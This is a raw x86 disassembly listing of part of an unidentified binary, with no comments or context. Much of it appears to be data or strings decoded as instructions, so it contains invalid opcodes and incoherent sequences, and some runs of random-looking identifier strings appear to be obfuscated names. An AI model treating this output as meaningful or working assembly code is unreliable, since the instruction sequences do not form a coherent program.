  4214ed:	add    BYTE PTR [edx+0x0],bl
  4214f0:	add    BYTE PTR [eax],al
  4214f2:	imul   BYTE PTR [eax+0x874587f]
  4214f8:	and    eax,0x29aeec0e
  4214fd:	int3   
  4214fe:	push   edi
  4214ff:	fisub  DWORD PTR [ebp-0x2fe2cb6c]
  421505:	retf   0x39a7
  421508:	jp     0x421561
  42150a:	dec    esi
  42150b:	xchg   esp,eax
  42150c:	stc    
  42150d:	hlt    
  42150e:	sahf   
  42150f:	sbb    BYTE PTR [edx],bh
  421511:	in     eax,dx
  421512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421513:	nop
  421514:	sbb    eax,eax
  421516:	xor    ch,BYTE PTR [edx+0x4c]
  421519:	out    0xcf,eax
  42151b:	cmc    
  42151c:	pop    edi
  42151d:	shl    DWORD PTR [ebp+0x327669e1],1
  421523:	outs   dx,BYTE PTR ds:[esi]
  421524:	pop    esp
  421525:	cmp    ebx,DWORD PTR [edi-0x10]
  421528:	mov    esp,0xe51979e7
  42152d:	es ja  0x421563
  421530:	xor    BYTE PTR [ecx+0x23],0x44
  421534:	mov    edx,0x4722f5e6
  421539:	int    0x19
  42153b:	popf   
  42153c:	ret    
  42153d:	sbb    DWORD PTR [eax-0x46],esp
  421540:	jl     0x4214e0
  421542:	xchg   edi,eax
  421543:	sbb    eax,0xd42b4e7d
  421548:	pusha  
  421549:	jae    0x421501
  42154b:	outs   dx,BYTE PTR ds:[esi]
	...
  421558:	add    BYTE PTR [eax],al
  42155a:	addr16 (bad) 
  42155c:	and    dh,dh
  42155e:	mov    eax,ds:0xe7d7f7f6
  421563:	mov    eax,0x359fda72
  421568:	les    esp,FWORD PTR [edi+eax*2+0x5a0001e0]
  42156f:	add    BYTE PTR [eax],al
  421571:	add    BYTE PTR [ebp+ebp*1+0x21611097],dh
  421578:	sbb    al,0x63
  42157a:	jno    0x4215cc
  42157c:	mov    eax,0xa314e66c
  421581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421582:	jae    0x4215d3
  421584:	xor    al,0x89
  421586:	fsubr  DWORD PTR [eax]
  421588:	(bad)  
  421589:	xchg   edi,eax
  42158a:	adc    BYTE PTR [esi+esi*1+0x5e75b32f],al
  421591:	lahf   
  421592:	push   ebp
  421593:	xchg   ebp,eax
  421594:	and    esi,esi
  421596:	mov    gs,WORD PTR [ecx]
  421598:	arpl   WORD PTR [esi+0x40c31b45],ax
  42159e:	push   ss
  42159f:	inc    edx
  4215a0:	mov    BYTE PTR [eax],bh
  4215a2:	add    al,BYTE PTR [ebx]
  4215a4:	pushf  
  4215a5:	jne    0x4215cb
  4215a7:	out    dx,eax
  4215a8:	cmp    DWORD PTR [ebp+0x246ee90c],ebp
  4215ae:	push   es
  4215af:	push   ebx
  4215b0:	and    eax,0x7ea23700
  4215b5:	adc    esp,DWORD PTR [esi+0x52]
  4215b8:	pop    ss
  4215b9:	mov    fs,WORD PTR [ebp+ebp*4+0x63]
  4215bd:	div    DWORD PTR [edx]
  4215bf:	sub    bh,BYTE PTR [edi]
  4215c1:	repnz or esi,DWORD PTR [esi+ebp*8-0xb686ad]
  4215c9:	inc    esi
  4215ca:	jnp    0x42158e
	...
  4215d8:	add    BYTE PTR [eax],al
  4215da:	ret    
  4215db:	or     eax,0xefee66a6
  4215e0:	ret    
  4215e1:	lods   eax,DWORD PTR ds:[esi]
  4215e2:	sub    al,0xb8
  4215e4:	mov    ds:0xffbefe47,eax
  4215e9:	iret   
  4215ea:	mov    eax,ds:0x5a0001e0
  4215ef:	add    BYTE PTR [eax],al
  4215f1:	add    BYTE PTR [edi+0xc0a7b56],bl
  4215f7:	pop    esi
  4215f8:	adc    al,0x86
  4215fa:	loopne 0x421634
  4215fc:	xor    BYTE PTR [esi-0x56076e48],0xa5
  421603:	jns    0x42167a
  421605:	aam    0x30
  421607:	adc    DWORD PTR [ebp+0x16f856d9],edx
  42160d:	xor    bh,bl
  42160f:	pop    ss
  421610:	and    al,ch
  421612:	add    al,0x9b
  421614:	(bad)  
  421615:	in     eax,dx
  421616:	push   edx
  421617:	in     al,0x1a
  421619:	jmp    0x6a326354
  42161e:	mov    ch,0x57
  421620:	int3   
  421621:	imul   ebx,DWORD PTR [edi],0xffffffc1
  421624:	xlat   BYTE PTR ds:[ebx]
  421625:	fisubr WORD PTR [edx+0x75]
  421628:	div    DWORD PTR [esi-0x70bf1426]
  42162e:	daa    
  42162f:	leave  
  421630:	push   esp
  421631:	mul    BYTE PTR [edi-0x2]
  421634:	dec    edx
  421635:	mov    bh,0x2e
  421637:	sbb    esi,esi
  421639:	retf   0x366
  42163c:	add    DWORD PTR [ecx+ebx*2-0x2c91f8b9],ebx
  421643:	push   cs
  421644:	popf   
  421645:	xlat   BYTE PTR ds:[ebx]
  421646:	pand   mm0,QWORD PTR [edx]
  421649:	scas   al,BYTE PTR es:[edi]
  42164a:	scas   al,BYTE PTR es:[edi]
  42164b:	test   DWORD PTR [eax],eax
	...
  421659:	add    cl,bl
  42165b:	ret    0x4905
  42165e:	pop    ds
  42165f:	iret   
  421660:	fst    st(2)
  421662:	enter  0xf86f,0xd2
  421666:	ja     0x42166f
  421668:	sub    edx,eax
  42166a:	sti    
  42166b:	loopne 0x42166e
  42166d:	add    BYTE PTR [edx+0x0],bl
  421670:	add    BYTE PTR [eax],al
  421672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421673:	loopne 0x42169c
  421675:	mov    edi,0x3a9004c0
  42167a:	cmp    edi,DWORD PTR [ebp-0x9521f6a]
  421680:	test   al,0xbe
  421682:	(bad)  
  421683:	lods   eax,DWORD PTR ds:[esi]
  421684:	push   es
  421685:	lahf   
  421686:	int3   
  421687:	out    dx,eax
  421688:	and    BYTE PTR [esp-0x3331f368],bl
  42168f:	in     al,dx
  421690:	add    BYTE PTR [ecx+0xa894278],bl
  421696:	adc    al,0xce
  421698:	pusha  
  421699:	iret   
  42169a:	dec    ax
  42169c:	xchg   esp,eax
  42169d:	ror    DWORD PTR [edx+0x223070a2],cl
  4216a3:	int3   
  4216a4:	push   ebx
  4216a5:	frstor [ebp-0x72a378f4]
  4216ab:	jbe    0x421660
  4216ad:	aas    
  4216ae:	push   0xffffff8b
  4216b0:	or     eax,DWORD PTR [ecx-0x70]
  4216b3:	jbe    0x42164e
  4216b5:	and    ch,al
  4216b7:	adc    edi,ebp
  4216b9:	pop    ecx
  4216ba:	sti    
  4216bb:	iret   
  4216bc:	jecxz  0x421706
  4216be:	xchg   ecx,eax
  4216bf:	loopne 0x421736
  4216c1:	gs pushf 
  4216c3:	popf   
  4216c4:	imul   esp,DWORD PTR [esi],0xffffff87
  4216c7:	mov    bh,0x38
  4216c9:	jb     0x421738
  4216cb:	scas   eax,DWORD PTR es:[edi]
	...
  4216d8:	add    BYTE PTR [eax],al
  4216da:	popa   
  4216db:	pop    edi
  4216dc:	lock (bad) 
  4216de:	(bad)  
  4216df:	out    dx,eax
  4216e0:	repz pop edi
  4216e2:	mov    dl,0xc5
  4216e4:	ret    
  4216e5:	in     eax,dx
  4216e6:	and    bl,BYTE PTR [eax+0x73]
  4216e9:	ret    0xe155
  4216ec:	add    DWORD PTR [eax],eax
  4216ee:	push   cs
  4216ef:	add    BYTE PTR [eax],al
  4216f1:	add    ah,ch
  4216f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216f4:	jns    0x421756
  4216f6:	lock sbb edi,DWORD PTR [ebp+0x25]
  4216fa:	add    ah,BYTE PTR [ebx]
  4216fc:	imul   ebp,DWORD PTR [eax+0x3fd],0x0
  421706:	add    BYTE PTR [eax],al
  421708:	add    BYTE PTR [eax],al
  42170a:	add    BYTE PTR [eax-0x6ffbffbe],dl
  421710:	inc    edx
  421711:	add    BYTE PTR [eax],cl
  421713:	nop
  421714:	inc    edx
  421715:	add    BYTE PTR [eax+edx*4],cl
  421718:	inc    edx
  421719:	add    BYTE PTR [eax],dl
  42171b:	nop
  42171c:	inc    edx
  42171d:	add    BYTE PTR [eax+edx*4],dl
  421720:	inc    edx
  421721:	add    BYTE PTR [eax],bl
  421723:	nop
  421724:	inc    edx
  421725:	add    BYTE PTR [eax+edx*4],bl
  421728:	inc    edx
  421729:	add    BYTE PTR [eax],al
  42172b:	mov    al,ds:0xa0040042
  421730:	inc    edx
  421731:	add    BYTE PTR [eax],cl
  421733:	mov    al,ds:0xa00c0042
  421738:	inc    edx
  421739:	add    BYTE PTR [eax],dl
  42173b:	mov    al,ds:0xa0140042
  421740:	inc    edx
  421741:	add    BYTE PTR [eax],bl
  421743:	mov    al,ds:0xa01c0042
  421748:	inc    edx
  421749:	add    BYTE PTR [eax],al
  42174b:	mov    al,0x42
  42174d:	add    BYTE PTR [eax+esi*4],al
  421750:	inc    edx
  421751:	add    BYTE PTR [eax],cl
  421753:	mov    al,0x42
  421755:	add    BYTE PTR [eax+esi*4],cl
  421758:	inc    edx
  421759:	add    BYTE PTR [eax],dl
  42175b:	mov    al,0x42
  42175d:	add    BYTE PTR [eax+esi*4],dl
  421760:	inc    edx
  421761:	add    BYTE PTR [eax],bl
  421763:	mov    al,0x42
  421765:	add    BYTE PTR [eax+esi*4],bl
  421768:	inc    edx
  421769:	add    BYTE PTR [eax+0x66],bh
  42176c:	ins    BYTE PTR es:[edi],dx
  42176d:	jp     0x4217c6
  42176f:	jbe    0x4217b8
  421771:	ja     0x4217b6
  421773:	js     0x4217bd
  421775:	jno    0x4217da
  421777:	inc    edx
  421778:	inc    bx
  42177a:	push   ebp
  42177b:	jno    0x4217f3
  42177d:	ja     0x4217e6
  42177f:	dec    edi
  421780:	dec    esp
  421781:	dec    ebp
  421782:	inc    edx
  421783:	jno    0x4217f6
  421785:	jae    0x4217da
  421787:	push   eax
  421788:	arpl   WORD PTR [ebx+0x32],dx
  42178b:	sbb    eax,DWORD PTR [edx+0x0]
  42178e:	cmp    bl,BYTE PTR [ebx]
  421790:	inc    edx
  421791:	add    dl,dl
  421793:	sbb    DWORD PTR [edx+0x0],eax
  421796:	out    dx,eax
  421797:	or     esi,DWORD PTR [edx+0x304e790e]
  42179d:	dec    esi
  42179e:	xchg   DWORD PTR [edi+0x3d],ecx
  4217a1:	dec    esi
  4217a2:	scas   eax,DWORD PTR es:[edi]
  4217a3:	dec    edi
  4217a4:	ds dec esi
  4217a6:	js     0x4217f6
  4217a8:	cmp    ecx,DWORD PTR [esi-0x64]
  4217ab:	dec    edi
  4217ac:	inc    esp
  4217ad:	dec    esi
  4217ae:	jae    0x4217fe
  4217b0:	inc    ecx
  4217b1:	dec    esi
  4217b2:	xor    BYTE PTR [esi+0x40],cl
  4217b5:	dec    esi
  4217b6:	pop    esp
  4217b7:	pop    ebp
  4217b8:	pop    edi
  4217b9:	push   edx
  4217ba:	cmp    DWORD PTR [esi+0x79],ecx
  4217bd:	dec    esi
  4217be:	xor    BYTE PTR [esi-0x79],cl
  4217c1:	dec    edi
  4217c2:	cmp    eax,0x3e4faf4e
  4217c7:	dec    esi
  4217c8:	js     0x421818
  4217ca:	cmp    ecx,DWORD PTR [esi-0x64]
  4217cd:	dec    edi
  4217ce:	inc    esp
  4217cf:	dec    esi
  4217d0:	mov    DWORD PTR [edi+0x41],ecx
  4217d3:	dec    esi
  4217d4:	xor    BYTE PTR [esi+0x40],cl
  4217d7:	dec    esi
  4217d8:	pop    esp
  4217d9:	ins    DWORD PTR es:[edi],dx
  4217da:	pop    edi
  4217db:	bound  edi,QWORD PTR [ecx]
  4217dd:	dec    esi
  4217de:	jns    0x42182e
  4217e0:	xor    BYTE PTR [esi-0x80],cl
  4217e3:	dec    edi
  4217e4:	cmp    eax,0x394e734e
  4217e9:	dec    esi
  4217ea:	mov    ds:0x304e3a4f,al
  4217ef:	dec    esi
  4217f0:	inc    esi
  4217f1:	dec    esi
  4217f2:	pop    esp
  4217f3:	jge    0x421854
  4217f5:	jb     0x421866
  4217f7:	sub    BYTE PTR [esi-0x7d],0x7e
  4217fb:	xchg   ebx,eax
  4217fc:	jns    0x42178e
  4217fe:	aas    
  4217ff:	dec    esi
  421800:	test   BYTE PTR [edi+0x30],cl
  421803:	dec    esi
  421804:	test   BYTE PTR [edi+0x3c],cl
  421807:	dec    esi
  421808:	mov    ds:0x734e394f,al
  42180d:	dec    esi
  42180e:	inc    ebp
  42180f:	dec    esi
  421810:	xor    BYTE PTR [esi+0x44],cl
  421813:	dec    esi
  421814:	pop    esp
  421815:	lea    ebx,[edi-0x7e]
  421818:	outs   dx,DWORD PTR ds:[esi]
  421819:	xchg   edx,eax
  42181a:	outs   dx,BYTE PTR ds:[esi]
  42181b:	xchg   ebx,eax
  42181c:	jle    0x4217c1
  42181e:	jns    0x4217c0
  421820:	aas    
  421821:	dec    esi
  421822:	test   BYTE PTR [edi+0x30],cl
  421825:	dec    esi
  421826:	test   BYTE PTR [edi+0x3c],cl
  421829:	dec    esi
  42182a:	mov    ds:0x894e394f,al
  42182f:	dec    edi
  421830:	inc    ebp
  421831:	dec    esi
  421832:	xor    BYTE PTR [esi+0x44],cl
  421835:	dec    esi
  421836:	pop    esp
  421837:	popf   
  421838:	pop    edi
  421839:	xchg   edx,eax
  42183a:	outs   dx,DWORD PTR ds:[esi]
  42183b:	mov    ds:0xb37ea36e,al
  421840:	jns    0x4217f2
  421842:	aas    
  421843:	dec    esi
  421844:	mov    cs,WORD PTR [edi+0x30]
  421847:	dec    esi
  421848:	lods   al,BYTE PTR ds:[esi]
  421849:	dec    edi
  42184a:	cmp    eax,0x394e734e
  42184f:	dec    esi
  421850:	mov    eax,ds:0x304e3a4f
  421855:	dec    esi
  421856:	inc    esp
  421857:	dec    esi
  421858:	pop    esp
  421859:	lods   eax,DWORD PTR ds:[esi]
  42185a:	pop    edi
  42185b:	mov    ds:0xb36eb26f,al
  421860:	jle    0x421825
  421862:	jns    0x421824
  421864:	aas    
  421865:	dec    esi
  421866:	mov    cs,WORD PTR [edi+0x30]
  421869:	dec    esi
  42186a:	lods   al,BYTE PTR ds:[esi]
  42186b:	dec    edi
  42186c:	cmp    eax,0x394e7e4e
  421871:	dec    esi
  421872:	lahf   
  421873:	dec    edi
  421874:	cmp    ecx,DWORD PTR [esi+0x30]
  421877:	dec    esi
  421878:	inc    ebp
  421879:	dec    esi
  42187a:	pop    esp
  42187b:	mov    ebp,0xc26fb25f
  421880:	outs   dx,BYTE PTR ds:[esi]
  421881:	ret    
  421882:	jle    0x421857
  421884:	jns    0x421856
  421886:	aas    
  421887:	dec    esi
  421888:	mov    cs,WORD PTR [edi+0x30]
  42188b:	dec    esi
  42188c:	lods   al,BYTE PTR ds:[esi]
  42188d:	dec    edi
  42188e:	cmp    eax,0x394f804e
  421893:	dec    esi
  421894:	lods   al,BYTE PTR ds:[esi]
  421895:	dec    edi
  421896:	cmp    cl,BYTE PTR [esi+0x30]
  421899:	dec    esi
  42189a:	inc    esi
  42189b:	dec    esi
  42189c:	pop    esp
  42189d:	int    0x5f
  42189f:	ret    0xd26f
  4218a2:	outs   dx,BYTE PTR ds:[esi]
  4218a3:	sar    DWORD PTR [esi-0x1d],cl
  4218a6:	jns    0x421888
  4218a8:	aas    
  4218a9:	dec    esi
  4218aa:	mov    cs,WORD PTR [edi+0x30]
  4218ad:	dec    esi
  4218ae:	lods   al,BYTE PTR ds:[esi]
  4218af:	dec    edi
  4218b0:	cmp    eax,0x394f834e
  4218b5:	dec    esi
  4218b6:	mov    ds:0x304e3a4f,al
  4218bb:	dec    esi
  4218bc:	inc    esp
  4218bd:	dec    esi
  4218be:	pop    esp
  4218bf:	fstp   QWORD PTR [edi-0x2e]
  4218c2:	outs   dx,DWORD PTR ds:[esi]
  4218c3:	loop   0x421933
  4218c5:	jecxz  0x421945
  4218c7:	repz jns 0x4218ba
  4218ca:	aas    
  4218cb:	dec    esi
  4218cc:	lea    ecx,[edi+0x30]
  4218cf:	dec    esi
  4218d0:	lahf   
  4218d1:	dec    edi
  4218d2:	cmp    eax,0x3c4fa04e
  4218d7:	dec    esi
  4218d8:	xor    BYTE PTR [esi+0x3f],cl
  4218db:	dec    esi
  4218dc:	pop    esp
  4218dd:	in     eax,dx
  4218de:	pop    edi
  4218df:	loop   0x421950
  4218e1:	repnz outs dx,BYTE PTR ds:[esi]
  4218e3:	repz jle 0x4218e9
  4218e6:	jns    0x4218e8
  4218e8:	jle    0x4218fd
  4218ea:	jns    0x4218fc
  4218ec:	cmp    al,0x4e
  4218ee:	jg     0x42193e
  4218f0:	xor    BYTE PTR [esi-0x65],cl
  4218f3:	dec    edi
  4218f4:	xor    cl,BYTE PTR [esi-0x80]
  4218f7:	dec    edi
  4218f8:	cmp    al,0x4e
  4218fa:	lods   eax,DWORD PTR ds:[esi]
  4218fb:	dec    edi
  4218fc:	cmp    ecx,DWORD PTR [esi+0x30]
  4218ff:	dec    esi
  421900:	inc    ebp
  421901:	dec    esi
  421902:	pop    esp
  421903:	or     eax,0x126f025f
  421908:	outs   dx,BYTE PTR ds:[esi]
  421909:	adc    edi,DWORD PTR [esi+0x23]
  42190c:	jns    0x42192e
  42190e:	aas    
  42190f:	dec    esi
  421910:	add    BYTE PTR [eax],al
  421912:	call   0x4219:0x8e004217
  421919:	add    BYTE PTR [esi+0x3e004219],dl
  42191f:	sbb    eax,DWORD PTR [edx+0x0]
  421922:	stos   BYTE PTR es:[edi],al
  421923:	sbb    al,BYTE PTR [edx+0x0]
  421926:	sbb    eax,DWORD PTR cs:[edx+0x0]
  42192a:	jbe    0x421945
  42192c:	inc    edx
  42192d:	add    BYTE PTR [edx+0x19],bh
  421930:	inc    edx
  421931:	add    BYTE PTR [edx],ch
  421933:	sbb    eax,DWORD PTR [edx+0x0]
  421936:	ficomp WORD PTR [ecx]
  421938:	inc    edx
  421939:	add    BYTE PTR ds:0x36f89ca9,cl
  42193f:	mov    edx,0x1992f89c
  421944:	inc    edx
  421945:	add    BYTE PTR [edx+0x1a],ah
  421948:	inc    edx
  421949:	add    BYTE PTR [esi+0x1a],dh
  42194c:	inc    edx
  42194d:	add    BYTE PTR [edx-0x6dffbde6],al
  421953:	sbb    al,BYTE PTR [edx+0x0]
  421956:	retf   0x4219
  421959:	add    BYTE PTR [esi-0x15ffbde9],dl
  42195f:	sbb    DWORD PTR [edx+0x0],eax
  421962:	ficomp DWORD PTR [ecx]
  421964:	inc    edx
  421965:	add    BYTE PTR [edx+0x1b],al
  421968:	inc    edx
  421969:	add    BYTE PTR [esi+0x19f89c85],dh
  42196f:	or     edx,DWORD PTR [edi]
  421971:	sbb    DWORD PTR [esi+0x14004219],0x881161c
  42197b:	or     eax,0x705
  421980:	inc    eax
  421981:	add    BYTE PTR [edx],bh
  421983:	inc    edx
  421984:	ds ds enter 0x4279,0x0
  42198a:	ins    DWORD PTR es:[edi],dx
  42198b:	push   ebp
  42198c:	inc    esp
  42198d:	imul   ecx,DWORD PTR [eax],0x86275fa
  421993:	in     eax,dx
  421994:	inc    BYTE PTR [edi]
  421996:	aas    
  421997:	cli    
  421998:	mov    ds:0x42198605,eax
  42199d:	add    BYTE PTR [ebp-0x4a07636b],dh
  4219a3:	xchg   esi,eax
  4219a4:	pushf  
  4219a5:	clc    
  4219a6:	mov    ah,0x95
  4219a8:	pushf  
  4219a9:	clc    
  4219aa:	mov    ebx,0xbaf89c95
  4219af:	xchg   ebp,eax
  4219b0:	pushf  
  4219b1:	clc    
  4219b2:	mov    ecx,0xb8f89c95
  4219b7:	xchg   ebp,eax
  4219b8:	pushf  
  4219b9:	clc    
  4219ba:	mov    edi,0xbef89c95
  4219bf:	xchg   ebp,eax
  4219c0:	pushf  
  4219c1:	clc    
  4219c2:	mov    ebp,0xa6f89c95
  4219c7:	xchg   ebp,eax
  4219c8:	pushf  
  4219c9:	clc    
  4219ca:	jmp    0x4217:0x8e6003f9
  4219d1:	add    BYTE PTR [eax+eax*2+0x42],ch
  4219d5:	add    BYTE PTR [ebx+0x77],dl
  4219d8:	jbe    0x421a2a
  4219da:	mov    dh,0x85
  4219dc:	pushf  
  4219dd:	clc    
  4219de:	sbb    ecx,ebp
  4219e0:	push   eax
  4219e1:	pop    es
  4219e2:	dec    eax
  4219e3:	or     al,BYTE PTR [eax]
  4219e5:	add    BYTE PTR [edx+0x1b004217],cl
  4219eb:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421a1e:	ins    BYTE PTR es:[edi],dx
  421a1f:	inc    eax
  421a20:	inc    edx
  421a21:	add    BYTE PTR [esi+0x66f89c85],dh
  421a27:	add    BYTE PTR [edx+0x0],ch
  421a2a:	add    BYTE PTR [si+0x0],ah
  421a2e:	push   0x64006700
  421a33:	add    BYTE PTR [esi+0x0],ah
  421a36:	push   0x0
  421a38:	push   0x66006400
  421a3d:	add    BYTE PTR [edi+0x0],ah
  421a40:	push   0x0
  421a42:	push   0x66006700
  421a47:	add    BYTE PTR [eax+0x0],ch
  421a4a:	add    BYTE PTR [bp+0x0],ah
  421a4e:	push   0x66006700
	...
  421a5b:	add    BYTE PTR [eax],al
  421a5d:	add    BYTE PTR [edi+0x5c],ch
  421a60:	inc    eax
  421a61:	add    BYTE PTR [ebp-0x5db060b1],ah
  421a67:	dec    edi
  421a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a69:	dec    edi
  421a6a:	lahf   
  421a6b:	dec    edi
  421a6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a6d:	dec    edi
  421a6e:	ins    DWORD PTR es:[edi],dx
  421a6f:	dec    esi
  421a70:	bound  ecx,QWORD PTR [esi+0x30]
  421a73:	dec    esi
  421a74:	add    BYTE PTR [eax],al
  421a76:	cdq    
  421a77:	dec    edi
  421a78:	pushf  
  421a79:	dec    edi
  421a7a:	fwait
  421a7b:	dec    edi
  421a7c:	ins    DWORD PTR es:[edi],dx
  421a7d:	dec    esi
  421a7e:	bound  ecx,QWORD PTR [esi+0x30]
  421a81:	dec    esi
  421a82:	scas   eax,DWORD PTR es:[edi]
  421a83:	dec    edi
  421a84:	lods   eax,DWORD PTR ds:[esi]
  421a85:	dec    edi
  421a86:	lahf   
  421a87:	dec    edi
  421a88:	mov    ds:0x624e6d4f,al
  421a8d:	dec    esi
  421a8e:	xor    BYTE PTR [esi+0x0],cl
  421a91:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421a97:	dec    edi
  421a98:	test   eax,0xa04f934f
  421a9d:	dec    edi
  421a9e:	fwait
  421a9f:	dec    edi
  421aa0:	xor    BYTE PTR [esi+0x0],cl
  421aa3:	add    BYTE PTR [eax],al
  421aa5:	add    BYTE PTR [eax],al
  421aa7:	add    BYTE PTR [eax],al
  421aa9:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421ab0:	mov    WORD PTR [ebp-0x32734274],gs
  421ab6:	mov    ebp,ds
  421ab8:	mov    ebp,gs
  421aba:	mov    ebp,?
  421abc:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421ac2:	mov    WORD PTR ds:0x6d8c5d8c,?
  421ac8:	mov    WORD PTR [edx-0x74],?
  421acb:	jae    0x421a59
  421acd:	jo     0x421a5b
  421acf:	jno    0x421a5d
  421ad1:	jbe    0x421a5f
  421ad3:	ja     0x421a61
  421ad5:	je     0x421a63
  421ad7:	jne    0x421a65
  421ad9:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421ae0:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421ae6:	lods   al,BYTE PTR ds:[esi]
  421ae7:	jge    0x421aa5
  421ae9:	jge    0x421a89
  421aeb:	(bad)  
  421aec:	jns    0x421b61
  421aee:	mov    ecx,0x7d738cb1
  421af3:	ins    DWORD PTR es:[edi],dx
  421af4:	enter  0x9fc6,0x26
  421af8:	jb     0x421afd
  421afa:	test   eax,0xb956bb17
  421aff:	hlt    
  421b00:	test   al,0x37
  421b02:	test   al,0x7e
  421b04:	fnstenv [ecx-0x6a]
  421b07:	mov    cl,0x6a
  421b09:	push   0xffffffce
  421b0b:	or     BYTE PTR [edx],bl
  421b0d:	xlat   BYTE PTR ds:[ebx]
  421b0e:	out    dx,eax
  421b0f:	add    eax,0x9321d7aa
  421b14:	scas   al,BYTE PTR es:[edi]
  421b15:	adc    DWORD PTR [esi],esp
  421b17:	jge    0x421b3c
  421b19:	fidiv  WORD PTR [edi]
  421b1b:	leave  
  421b1c:	hlt    
  421b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b1e:	cmp    ax,0x1fc8
  421b22:	mov    dh,cl
  421b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b25:	(bad)  
  421b26:	and    DWORD PTR [eax],ebx
  421b28:	and    DWORD PTR [ecx-0x18],esi
  421b2b:	(bad)  [ebx+0x7]
  421b2e:	cmc    
  421b2f:	enter  0x301a,0x14
  421b33:	inc    eax
  421b34:	inc    edx
  421b35:	add    BYTE PTR [ecx+0x66],dh
  421b38:	jp     0x421ba8
  421b3a:	jle    0x421b55
  421b3c:	inc    edx
  421b3d:	add    dl,ah
  421b3f:	sbb    DWORD PTR [edx+0x0],eax
  421b42:	or     ch,ch
  421b44:	adc    al,BYTE PTR [edi]
  421b46:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421b4d:	ins    BYTE PTR es:[edi],dx
  421b4e:	push   0x49657557
  421b53:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421b59:	push   edi
  421b5a:	jp     0x421bd6
  421b5c:	dec    ebp
  421b5d:	push   esi
  421b5e:	arpl   WORD PTR gs:[ecx+0x45],si
  421b62:	dec    edx
  421b63:	dec    esi
  421b64:	data16 ja 0x421bb5
  421b67:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421b82:	inc    ebp
  421b83:	push   edx
  421b84:	jb     0x421bfa
  421b86:	inc    esi
  421b87:	je     0x421bca
  421b89:	inc    esi
  421b8a:	jae    0x421c02
  421b8c:	dec    ebx
  421b8d:	gs dec ecx
  421b8f:	dec    ebp
  421b90:	dec    ebp
  421b91:	pop    edx
  421b92:	jp     0x421bee
  421b94:	jbe    0x421bdc
  421b96:	pop    ecx
  421b97:	jo     0x421c11
  421b99:	inc    edi
  421b9a:	gs ins BYTE PTR es:[edi],dx
  421b9c:	dec    esp
  421b9d:	js     0x421c07
  421b9f:	inc    edx
  421ba0:	js     0x421be8
  421ba2:	dec    eax
  421ba3:	inc    ebp
  421ba4:	inc    esp
  421ba5:	inc    esp
  421ba6:	push   ecx
  421ba7:	dec    edx
  421ba8:	ins    BYTE PTR es:[edi],dx
  421ba9:	dec    ebx
  421baa:	jbe    0x421c1a
  421bac:	pop    eax
  421bad:	jbe    0x421bfa
  421baf:	inc    ecx
  421bb0:	fs gs jno 0x421c21
  421bb4:	push   ebx
  421bb5:	inc    ecx
  421bb6:	add    BYTE PTR [eax],al
  421bb8:	inc    ebx
  421bb9:	outs   dx,BYTE PTR ds:[esi]
  421bba:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421bbe:	push   edx
  421bbf:	push   ecx
  421bc0:	push   0x74000064
  421bc5:	jne    0x421c3c
  421bc7:	ins    DWORD PTR es:[edi],dx
  421bc8:	push   ecx
  421bc9:	push   eax
  421bca:	jo     0x421c46
  421bcc:	addr16 jo 0x421c25
  421bcf:	pop    eax
  421bd0:	add    BYTE PTR [eax],al
  421bd2:	push   ecx
  421bd3:	pop    ecx
  421bd4:	inc    ebx
  421bd5:	inc    edx
  421bd6:	outs   dx,BYTE PTR ds:[esi]
  421bd7:	popa   
  421bd8:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421bdc:	jne    0x421c4c
  421bde:	dec    ebx
  421bdf:	je     0x421c44
  421be1:	bound  esp,QWORD PTR [edi+0x0]
  421be4:	jns    0x421c2b
  421be6:	bound  ebp,QWORD PTR [ecx+0x46]
  421be9:	dec    ecx
  421bea:	ja     0x421c31
  421bec:	dec    eax
  421bed:	inc    ebp
  421bee:	inc    edx
  421bef:	push   ebx
  421bf0:	add    BYTE PTR [eax],al
  421bf2:	outs   dx,DWORD PTR ds:[esi]
  421bf3:	inc    edi
  421bf4:	dec    esi
  421bf5:	outs   dx,DWORD PTR ds:[esi]
  421bf6:	pop    ecx
  421bf7:	inc    edi
  421bf8:	jb     0x421c41
  421bfa:	jns    0x421c72
  421bfc:	inc    ecx
  421bfd:	pop    eax
  421bfe:	dec    esp
  421bff:	add    BYTE PTR [eax+0x48],bh
  421c02:	bound  edx,QWORD PTR [ebx+0x43]
  421c05:	pop    eax
  421c06:	outs   dx,DWORD PTR ds:[esi]
  421c07:	push   0x4355
  421c0c:	dec    esp
  421c0d:	ins    BYTE PTR es:[edi],dx
  421c0e:	inc    edx
  421c0f:	push   0x76666a73
  421c14:	inc    edx
  421c15:	jo     0x421c17
  421c17:	add    BYTE PTR [eax],al
  421c19:	add    BYTE PTR [edi+0x6d],ah
  421c1c:	je     0x421c65
  421c1e:	ins    BYTE PTR es:[edi],dx
  421c1f:	jae    0x421c8b
  421c21:	inc    esi
  421c22:	ins    DWORD PTR es:[edi],dx
  421c23:	je     0x421c7b
  421c25:	push   0x56584178
  421c2a:	push   ebx
  421c2b:	addr16 dec edx
  421c2d:	jo     0x421ca1
  421c2f:	js     0x421ca0
  421c31:	pop    eax
  421c32:	dec    ebx
  421c33:	push   esp
  421c34:	dec    esp
  421c35:	jns    0x421c82
  421c37:	js     0x421cb1
  421c39:	outs   dx,BYTE PTR ds:[esi]
  421c3a:	pop    ecx
  421c3b:	jae    0x421cab
  421c3d:	push   0x43644448
  421c42:	arpl   WORD PTR [edx+0x55],sp
  421c45:	push   0x42504e67
  421c4a:	push   ebp
  421c4b:	je     0x421cc2
  421c4d:	addr16 dec edi
  421c4f:	dec    esp
